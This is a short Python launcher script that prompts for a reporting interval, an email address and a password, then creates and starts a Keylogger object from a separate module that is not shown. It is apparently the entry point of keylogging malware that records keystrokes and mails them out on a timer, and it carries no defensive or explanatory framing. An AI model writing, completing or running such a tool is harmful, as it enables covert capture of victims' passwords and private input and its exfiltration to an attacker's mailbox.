import code

interval = int(input("Enter the time interval(in seconds): "))
email = str(input("Enter the email address: "))
password = str(input("Enter the password: "))

keylogger = code.Keylogger(interval, email , password)
keylogger.start()
